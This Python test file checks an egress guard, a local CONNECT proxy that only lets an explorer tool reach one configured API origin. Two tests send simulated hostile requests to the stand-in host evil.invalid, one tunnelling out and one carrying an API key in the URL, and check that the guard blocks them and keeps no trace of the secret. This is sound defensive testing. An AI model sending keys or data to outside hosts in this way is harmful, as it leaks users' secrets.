"""Pruebas de la guardia CONNECT que limita la salida del explorador."""

from __future__ import annotations

import base64
import os
import socket
import threading
from urllib.parse import unquote, urlsplit

import pytest

from src.adapters.egress import ExplorerEgressGuard


def _proxy_request(proxy_url: str, authority: str) -> socket.socket:
    parsed = urlsplit(proxy_url)
    assert parsed.hostname == "127.0.0.1"
    assert parsed.port is not None
    assert parsed.username is not None
    assert parsed.password is not None
    credentials = f"{unquote(parsed.username)}:{unquote(parsed.password)}".encode("ascii")
    authorization = base64.b64encode(credentials).decode("ascii")
    client = socket.create_connection((parsed.hostname, parsed.port), timeout=2)
    client.sendall(
        (
            f"CONNECT {authority} HTTP/1.1\r\n"
            f"Host: {authority}\r\n"
            f"Proxy-Authorization: Basic {authorization}\r\n\r\n"
        ).encode("ascii")
    )
    return client


def test_guard_blocks_cross_host_connect_before_opening_tls() -> None:
    guard = ExplorerEgressGuard("https://api.etherscan.io/v2/api")

    with guard:
        environment = dict(guard.environment)
        client = _proxy_request(environment["HTTPS_PROXY"], "evil.invalid:443")
        try:
            response = client.recv(1024)
        finally:
            client.close()

    assert response.startswith(b"HTTP/1.1 403")
    assert guard.blocked_targets == ("evil.invalid:443",)
    assert environment["NO_PROXY"] == "__sourceth_force_proxy__.invalid"
    assert environment["HTTP_PROXY"] == environment["HTTPS_PROXY"]
    assert environment["ALL_PROXY"] == environment["HTTPS_PROXY"]


def test_guard_relays_only_the_explicit_configured_origin() -> None:
    upstream = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    upstream.bind(("127.0.0.1", 0))
    upstream.listen(1)
    upstream_port = int(upstream.getsockname()[1])

    def echo_once() -> None:
        connection, _peer = upstream.accept()
        try:
            assert connection.recv(1024) == b"client-data"
            connection.sendall(b"server-data")
        finally:
            connection.close()
            upstream.close()

    server = threading.Thread(target=echo_once, daemon=True)
    server.start()
    guard = ExplorerEgressGuard(f"https://127.0.0.1:{upstream_port}/private/path")

    with guard:
        client = _proxy_request(
            guard.environment["HTTPS_PROXY"],
            f"127.0.0.1:{upstream_port}",
        )
        try:
            response = client.recv(1024)
            assert response.startswith(b"HTTP/1.1 200")
            client.sendall(b"client-data")
            assert client.recv(1024) == b"server-data"
        finally:
            client.close()

    server.join(timeout=2)
    assert not server.is_alive()
    assert guard.blocked_targets == ()


def test_guard_preserves_response_after_client_half_close() -> None:
    upstream = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    upstream.bind(("127.0.0.1", 0))
    upstream.listen(1)
    upstream_port = int(upstream.getsockname()[1])

    def respond_after_eof() -> None:
        connection, _peer = upstream.accept()
        try:
            assert connection.recv(1024) == b"request"
            assert connection.recv(1024) == b""
            connection.sendall(b"response-after-eof")
        finally:
            connection.close()
            upstream.close()

    server = threading.Thread(target=respond_after_eof, daemon=True)
    server.start()
    guard = ExplorerEgressGuard(f"https://127.0.0.1:{upstream_port}/api")

    with guard:
        client = _proxy_request(
            guard.environment["HTTPS_PROXY"],
            f"127.0.0.1:{upstream_port}",
        )
        try:
            assert client.recv(1024).startswith(b"HTTP/1.1 200")
            client.sendall(b"request")
            client.shutdown(socket.SHUT_WR)
            assert client.recv(1024) == b"response-after-eof"
        finally:
            client.close()

    server.join(timeout=2)
    assert not server.is_alive()


def test_guard_rejects_authenticated_non_connect_without_retaining_url_secret() -> None:
    guard = ExplorerEgressGuard("https://api.etherscan.io/v2/api")

    with guard:
        parsed = urlsplit(guard.environment["HTTP_PROXY"])
        assert parsed.hostname is not None and parsed.port is not None
        assert parsed.username is not None and parsed.password is not None
        credentials = f"{unquote(parsed.username)}:{unquote(parsed.password)}".encode("ascii")
        authorization = base64.b64encode(credentials).decode("ascii")
        client = socket.create_connection((parsed.hostname, parsed.port), timeout=2)
        try:
            client.sendall(
                (
                    "GET http://evil.invalid/path?apikey=DO_NOT_KEEP HTTP/1.1\r\n"
                    "Host: evil.invalid\r\n"
                    f"Proxy-Authorization: Basic {authorization}\r\n\r\n"
                ).encode("ascii")
            )
            response = client.recv(1024)
        finally:
            client.close()

    assert response.startswith(b"HTTP/1.1 403")
    assert guard.blocked_targets == ("<non-CONNECT>",)
    assert "DO_NOT_KEEP" not in repr(guard.blocked_targets)


def test_guard_start_failure_keeps_original_error_and_closes_listener(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    guard = ExplorerEgressGuard("https://api.etherscan.io/v2/api")

    def fail_start(_thread: threading.Thread) -> None:
        raise RuntimeError("injected-start-failure")

    monkeypatch.setattr(threading.Thread, "start", fail_start)
    with pytest.raises(RuntimeError, match="injected-start-failure"):
        guard.__enter__()
    with pytest.raises(RuntimeError, match="no está activa"):
        _ = guard.environment


def test_guard_rejects_reentry_after_close() -> None:
    guard = ExplorerEgressGuard("https://api.etherscan.io/v2/api")

    with guard:
        assert guard.environment["HTTPS_PROXY"].startswith("http://sourceth:")

    with pytest.raises(RuntimeError, match="un solo uso"):
        guard.__enter__()


@pytest.mark.skipif(os.name != "nt", reason="SO_EXCLUSIVEADDRUSE es específico de Windows")
def test_guard_listener_cannot_be_rebound_on_windows() -> None:
    guard = ExplorerEgressGuard("https://api.etherscan.io/v2/api")

    with guard:
        parsed = urlsplit(guard.environment["HTTPS_PROXY"])
        assert parsed.port is not None
        rival = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            rival.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            with pytest.raises(OSError):
                rival.bind(("127.0.0.1", parsed.port))
        finally:
            rival.close()
